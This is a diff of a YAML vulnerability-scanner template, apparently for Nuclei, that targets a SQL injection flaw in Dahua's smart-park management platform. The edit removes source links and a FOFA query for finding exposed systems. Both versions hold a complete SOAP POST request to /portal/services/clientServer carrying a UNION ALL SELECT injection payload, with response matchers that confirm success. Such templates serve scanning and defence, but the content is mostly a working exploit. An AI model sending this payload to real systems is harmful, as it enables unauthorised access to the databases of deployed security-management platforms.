@@ -3,15 +3,11 @@ info:
   name: 大华智慧园区综合管理平台clientServerSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bacfffhp0cwb7sp7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bacfffhp0cwb7sp7
-    fofa: app="dahua-智慧园区综合管理平台"
 http:
 - raw:
-  - "POST /portal/services/clientServer HTTP/1.1\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nConnection: close\n\nContent-Type: text/xml;charset=UTF-8\n\n\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n\n  <soapenv:Header/>\n\n  <soapenv:Body>\n\n  <cli:getGroupInfoListByGroupId>\n\n    <!--type: string-->\n\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(1)-- -</arg0>\n\n    <!--type: long-->\n\n    <arg1>10</arg1>\n\n    </cli:getGroupInfoListByGroupId>\n\n    </soapenv:Body>\n\n  </soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nb923820dcc\n\n# 上传文件定位\n暂无"
+  - "POST /portal/services/clientServer HTTP/1.1\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nConnection: close\n\nContent-Type: text/xml;charset=UTF-8\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n\n  <soapenv:Header/>\n\n  <soapenv:Body>\n\n  <cli:getGroupInfoListByGroupId>\n\n    <!--type: string-->\n\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(1)-- -</arg0>\n\n    <!--type: long-->\n\n    <arg1>10</arg1>\n\n    </cli:getGroupInfoListByGroupId>\n\n    </soapenv:Body>\n\n  </soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nb923820dcc\n\n# 上传文件定位\n暂无"
   redirects: false
   matchers:
   - status:
